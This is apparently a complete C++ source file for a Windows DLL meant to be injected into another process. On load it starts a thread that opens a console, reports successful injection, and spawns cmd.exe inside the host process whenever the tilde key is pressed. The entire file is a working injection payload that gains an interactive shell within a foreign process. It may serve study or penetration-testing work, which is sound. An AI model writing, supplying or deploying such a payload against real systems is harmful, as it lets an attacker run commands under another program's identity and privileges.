#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <comdef.h>

void printError(const char* myMsg)
{
	DWORD err = GetLastError();
	wchar_t* msgBuf = nullptr;
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (wchar_t*)&msgBuf, 0, NULL);
	_bstr_t b(msgBuf); const char* c = b;
	printf(" [-] %s. err: %d %s", myMsg, err, c);
	LocalFree(msgBuf);
}

BOOL WINAPI InjectedThread(HMODULE hModule)
{
	AllocConsole();
	FILE* f = nullptr;
	freopen_s(&f, "CONOUT$", "w", stdout);

	printf("[*] dll injection successful\n");
	printf(" [*] press ESC key to close this thread.\n");
	printf(" [*] press tilde (~) key to spawn a console window.\n");

	bool cmdopen = false;

	while (1)
	{
		if (GetAsyncKeyState(VK_ESCAPE) & 0x01)
		{
			goto cleanup;
		}
		if (GetAsyncKeyState(VK_OEM_3) & 0x01 && !cmdopen)
		{
			printf("[*] spawning commandline...\n");
			// spawn process
			STARTUPINFO startInfo = { sizeof(startInfo) };
			PROCESS_INFORMATION procInfo;
			if (CreateProcess(L"C:\\Windows\\System32\\cmd.exe", nullptr, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, NULL, NULL, &startInfo, &procInfo))
			{
				cmdopen = true;
				printf(" [+] success!\n");
				// wait for process to finish, then close handles
				WaitForSingleObject(procInfo.hProcess, INFINITE);
				CloseHandle(procInfo.hProcess);
				CloseHandle(procInfo.hThread);
				printf("[*] command line was closed\n");
				cmdopen = false;
			}
			else
			{
				// error handling
				printError("unable to spawn process");
			}
		}
	}
cleanup:
	if (f) fclose(f);
	FreeConsole();
	FreeLibraryAndExitThread(hModule, 0);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)InjectedThread, hModule, 0, nullptr);
		if (hThread)
		{
			CloseHandle(hThread);
		}
	}
	return TRUE;
}